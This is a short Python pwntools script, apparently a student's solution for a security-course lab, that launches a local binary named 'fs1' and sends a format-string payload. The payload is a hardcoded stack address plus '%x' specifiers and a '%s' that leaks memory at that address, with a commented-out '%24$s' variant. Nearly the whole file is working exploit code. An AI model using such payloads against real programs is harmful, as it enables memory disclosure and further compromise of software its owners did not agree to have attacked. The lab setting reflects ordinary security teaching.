#!/usr/bin/env python3
from pwn import *
import shutil, os, sys

path = '/home/kali/Desktop/svt/Lab03/lab03_material/fs'
BINARY = os.path.join(path, 'fs1')

def make_payload():
    
    payload = b"\x9c\xce\xff\xff" + (b"_%x" * 6) + b"_%s"
   # payload = b"\x9c\xce\xff\xff" + (b"%24$s")
    return payload

def main():

    io = process(BINARY)

    g = io.recvuntil(b'Insert a string: ', timeout=1)
    print(g.decode())

    payload = make_payload()
    log.info(f"Sending payload of length {len(payload)}")
    io.sendline(payload)

    # read remainder of program output
    out = io.recvall(timeout=1)
    print(out.decode(errors='ignore'))
    print(out)

if __name__ == '__main__':
    main()
